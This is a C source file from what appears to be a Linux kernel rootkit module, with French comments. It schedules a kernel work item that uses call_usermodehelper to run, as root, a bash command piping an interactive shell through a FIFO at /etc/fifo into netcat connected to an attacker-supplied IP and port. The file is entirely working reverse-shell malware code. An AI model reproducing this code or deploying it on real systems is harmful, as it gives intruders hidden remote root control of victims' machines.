#include "revshell.h"

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm"
#define SHELL "/bin/bash"
#define EXEC_P1 "/bin/rm /etc/fifo;/usr/bin/mkfifo /etc/fifo;/bin/cat /etc/fifo|/bin/sh -i 2>&1 | /usr/bin/nc "
#define EXEC_P2 " >/etc/fifo"
				

void execute_reverse_shell(struct work_struct *work) {
    struct shell_params *params = (struct shell_params *)work;

    // Déclaration de l'environnement
    char *envp[] = {
        HOME,
        TERM,
        params->target_ip,
        params->target_port,
        NULL
    }; // Null terminated

    // Allocation et initialisation de la commande à exécuter
    char *exec = kmalloc(sizeof(char) * 256, GFP_KERNEL);
    memset(exec, 0, sizeof(char) * 256);

    // Construction de la commande avec les valeurs actuelles de l'IP et du port
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
    strcat(exec, " ");
    strcat(exec, params->target_port);
    strcat(exec, EXEC_P2);

    // Arguments pour call_usermodehelper
    char *argv[] = {
        SHELL,
        "-c",
        exec,
        NULL
    };

    // Impression pour le débogage
    printk(KERN_INFO ":: Starting reverse shell %s\n", exec);

    // Exécution de la commande en mode utilisateur
    int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (err < 0) {
        printk(KERN_INFO ":: Error executing usermodehelper.\n");
    }

    // Libération de la mémoire allouée
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);
}



int start_reverse_shell(char* ip, char* port){
    //Reserve memory for parameters and start work
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO ":: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    printk(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO ":: Error scheduling work of starting shell\n");
    }
    return err;

}
